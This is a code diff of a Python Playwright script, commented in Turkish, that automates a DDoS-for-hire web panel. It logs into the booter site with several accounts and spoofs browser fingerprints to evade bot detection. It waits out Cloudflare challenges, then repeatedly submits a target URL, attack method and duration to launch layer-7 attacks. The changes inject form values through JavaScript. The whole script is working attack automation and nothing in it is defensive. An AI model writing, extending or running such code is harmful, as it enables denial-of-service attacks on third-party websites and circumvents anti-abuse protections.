@@ -74,26 +74,22 @@ def attack_worker(account):
                     Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                 """)
 
-                # ---------- GİRİŞ (DOMContentLoaded kullan, networkidle bekleme) ----------
+                # ---------- GİRİŞ ----------
                 print(f"[{username}] 🔐 Giriş sayfasına gidiliyor...")
                 try:
-                    # Değişiklik 1: networkidle -> domcontentloaded
                     page.goto("https://l7srv.su/login", timeout=120000, wait_until="domcontentloaded")
                     
                     if "cf-browser-verification" in page.url or "challenge" in page.url:
                         print(f"[{username}] ⚡ Cloudflare challenge algılandı, geçilmesi bekleniyor...")
-                        page.wait_for_timeout(15000)  # 15 saniye bekle
+                        page.wait_for_timeout(15000)
                         page.reload(wait_until="domcontentloaded")
                         page.wait_for_timeout(5000)
 
-                    # #username gelene kadar bekle
                     page.wait_for_selector("#username", timeout=30000)
                     page.fill("#username", username)
                     page.fill("#password", password)
                     page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=15000)
                     page.click("#loginNextBtn")
-                    
-                    # Dashboard'a yönlenene kadar bekle
                     page.wait_for_url(lambda url: "/dash" in url, timeout=90000)
                     print(f"[{username}] ✅ Giriş başarılı!")
                     consecutive_errors = 0
@@ -127,15 +123,17 @@ def attack_worker(account):
                 # ---------- ANA SALDIRI DÖNGÜSÜ ----------
                 while True:
                     try:
-                        page.wait_for_selector("#l7host", timeout=15000)
-                        page.fill("#l7host", target_url)
-                        page.select_option("#l7method", value=method)
-                        time_value = 120 if method == "browser-free" else 200
-                        page.fill("#l7time", str(time_value))
-                        page.click("#l7btn")
-                        print(f"[{username}] 🔥 Saldırı başladı | {time_value} sn")
+                        # 🔥 DEĞİŞİKLİK: JavaScript ile doğrudan doldur ve tıkla
+                        page.evaluate(f"""
+                            document.getElementById('l7host').value = '{target_url}';
+                            document.getElementById('l7time').value = '120';
+                            document.getElementById('l7method').value = '{method}';
+                            document.getElementById('l7btn').click();
+                        """)
+                        print(f"[{username}] 🔥 Saldırı başladı | 120 sn")
                         consecutive_errors = 0
 
+                        # Saldırı durumu takibi
                         while True:
                             no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                             if no_attacks.count() > 0 and no_attacks.is_visible():
